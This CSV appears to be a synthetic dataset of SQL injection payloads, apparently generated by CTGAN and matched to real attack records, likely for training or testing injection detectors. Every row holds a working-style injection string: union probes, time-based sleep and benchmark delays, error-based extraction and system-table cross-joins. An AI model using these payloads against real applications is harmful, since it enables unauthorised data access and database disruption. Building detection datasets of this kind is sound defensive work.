id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000082,attack,other,"1,  (  case when 5514  =  9602 then 1 else null end  )  ",nearest_attack_euclidean,R008056,2.815976745676986
CTGAN_000083,attack,error,"1'  )   as mvai where 5856  =  5856 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",nearest_attack_euclidean,R001009,2.835245885079307
CTGAN_000084,attack,boolean,"1%""  )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R003483,3.1091185328895317
CTGAN_000085,attack,boolean,"1%"" and elt  (  4249  =  4249,7259  )   and ""%""  =  """,nearest_attack_euclidean,R001854,2.7491698243374314
CTGAN_000086,attack,union,"1'  )   where 5071  =  5071 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R008430,5.217293034085446
CTGAN_000087,attack,time,1'   )    )    as hzbj where 1725  =  1725 or sleep  (  5  )  #,nearest_attack_euclidean,R003853,3.505423013447624
CTGAN_000088,attack,boolean,"1 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  ",nearest_attack_euclidean,R003365,1.589033881345504
CTGAN_000089,attack,boolean,"1'||  (  select 'dbxr' where 4014  =  4014 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R002840,2.7567332903149664
CTGAN_000090,attack,other,"admin"" #",nearest_attack_euclidean,R000523,3.92629538448651
CTGAN_000091,attack,union,"-1510""  )   as rqrv where 4507  =  4507 union all select 4507,4507,4507,4507,4507--",nearest_attack_euclidean,R001208,4.061641890683641
CTGAN_000092,attack,union," select * from users where id  =  1 union select @<@$,version  (    )   -- 1",nearest_attack_euclidean,R000261,4.194142518823809
CTGAN_000093,attack,other,"1""  )   as frmp where 6073  =  6073",nearest_attack_euclidean,R003308,1.4358585286823506
CTGAN_000094,attack,other,1'||  (  select 'cfff' where 4994  =  4994,nearest_attack_euclidean,R001799,1.917278499628195
CTGAN_000095,attack,time,1'  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  'dtzt' like 'dtzt,nearest_attack_euclidean,R007347,3.947164197345635
CTGAN_000096,attack,boolean,"1' in boolean mode  )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R007603,3.7625210542705596
CTGAN_000097,attack,other,1   )    )    as cwyb where 3633  =  3633,nearest_attack_euclidean,R003367,1.8820762807401816
CTGAN_000098,attack,error,"1"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""gxhz""  =  ""gxhz",nearest_attack_euclidean,R006685,5.649865308067978
CTGAN_000099,attack,time,1'  )   as irck where 3660  =  3660 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --,nearest_attack_euclidean,R008511,17.694250096307613
CTGAN_000100,attack,error,"-7184  )   as fshx where 3408  =  3408 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",nearest_attack_euclidean,R003001,4.505966810478412
CTGAN_000101,attack,time,waitfor delay '0:0:5' and    (    (     (  'ozjl' like 'ozjl,nearest_attack_euclidean,R005892,3.9098607214966883
CTGAN_000102,attack,error,"1   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  7813  =  7813",nearest_attack_euclidean,R002736,3.4696328229541527
CTGAN_000103,attack,boolean,"1%'   )    )    and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   '%'  =  '",nearest_attack_euclidean,R007697,5.787072823338687
CTGAN_000104,attack,union,"-8215%""  )   union all select 3877,3877,3877,3877,3877,3877--",nearest_attack_euclidean,R003939,6.325725115091686
CTGAN_000105,attack,union,"1""   )    )     )   union all select null,null--",nearest_attack_euclidean,R003810,4.2033180820034834
CTGAN_000106,attack,boolean,"-7381'   )    )    or elt  (  5882  =  5919,5919  )   and    (    (   'nzri'  =  'nzri",nearest_attack_euclidean,R003337,2.646094883584636
CTGAN_000107,attack,time,1 where 7299  =  7299 rlike sleep  (  5  )  --,nearest_attack_euclidean,R004155,3.247486932276379
CTGAN_000108,attack,boolean,"-1598""   )    )    or elt  (  5329  =  9628,9628  )   and    (    (   ""hyxq"" like ""hyxq",nearest_attack_euclidean,R005841,2.382864655833204
CTGAN_000109,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R007185,4.092454688276781
CTGAN_000110,attack,time,"1',  (  select   (  case when   (  7734  =  7734  )   then   (  select benchmark  (  5000000,md5  (  0x72747341   )    )     )   else 7734*  (  select 7734 from mysql.db  )   end   )    )   ",nearest_attack_euclidean,R006753,7.284508505146005
CTGAN_000111,attack,other,1   )    )    as muyz where 6105  =  6105,nearest_attack_euclidean,R000889,7.871511555691598
CTGAN_000112,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R007185,4.384703337434495
CTGAN_000113,attack,error,"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'kwhs' like 'kwhs",nearest_attack_euclidean,R000790,2.5841129170149713
CTGAN_000114,attack,error,"1'  )   as hlbq where 2347  =  2347 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",nearest_attack_euclidean,R006016,5.388074300969779
CTGAN_000115,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R007483,2.4435753847775166
CTGAN_000116,attack,boolean,1'+  (  select 'xqjx' where 7048  =  7048 and 9198  =  9198--,nearest_attack_euclidean,R002001,2.6741563286444014
CTGAN_000117,attack,union,"1%""  )   union all select null,null,null,null--",nearest_attack_euclidean,R002266,7.392286455313827
CTGAN_000118,attack,union,"-6580'  )   union all select 9950,9950,9950,9950,9950,9950--",nearest_attack_euclidean,R005166,3.8614858091099737
CTGAN_000119,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R007483,3.593758403085932
CTGAN_000120,attack,union,union select * from users where login   =   char ...,nearest_attack_euclidean,R000155,7.838762532521198
CTGAN_000121,attack,union,"1""  )   where 2758  =  2758 union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000991,4.640808599268219
CTGAN_000122,attack,other,-8641%' order by 1--,nearest_attack_euclidean,R003417,4.674417293007202
CTGAN_000123,attack,error,"1'   )    )    as lxjs where 6503  =  6503 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",nearest_attack_euclidean,R006605,3.6327401956036307
CTGAN_000124,attack,error,"1' in boolean mode  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   #",nearest_attack_euclidean,R008406,3.0714052315807128
CTGAN_000125,attack,other,if  (  4907  =  9581  )   select 4907 else drop function apqw--,nearest_attack_euclidean,R008010,2.742351830704345
CTGAN_000126,attack,other,1'  )   as pudv where 2609  =  2609,nearest_attack_euclidean,R002866,0.9916023469014593
CTGAN_000127,attack,boolean,"1'   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R006418,3.559791200320879
CTGAN_000128,attack,error,"1   )    )     )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (     (  1748  =  1748",nearest_attack_euclidean,R000727,5.508393976183581
CTGAN_000129,attack,other,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   #",nearest_attack_euclidean,R007040,4.1310630922086915
CTGAN_000130,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   'nczi'  =  'nczi",nearest_attack_euclidean,R007610,8.69401389755843
CTGAN_000131,attack,boolean,1'||  (  select 'rjun' where 8868  =  8868 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   ||',nearest_attack_euclidean,R008780,6.192094678429429
CTGAN_000132,attack,error,"-8021'   )    )    or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'cenk' like 'cenk",nearest_attack_euclidean,R003292,5.3106873081493715
CTGAN_000133,attack,other,"  (  select   (  case when   (  3531  =  3531  )   then   (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   else 3531 end   )    )   ",nearest_attack_euclidean,R003079,6.89119327106093
CTGAN_000134,attack,time,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  -- paxv,nearest_attack_euclidean,R001041,4.265113399764486
CTGAN_000135,attack,other,"1"" where 9230  =  9230",nearest_attack_euclidean,R001494,1.6215709517888806
CTGAN_000136,attack,error,"1,  (  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select 1 from generate_series  (  8979,8979,case when   (  8979  =  8979  )   then 1 else 0 end  )   limit 1  )  ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    )   ",nearest_attack_euclidean,R008800,4.213671460018742
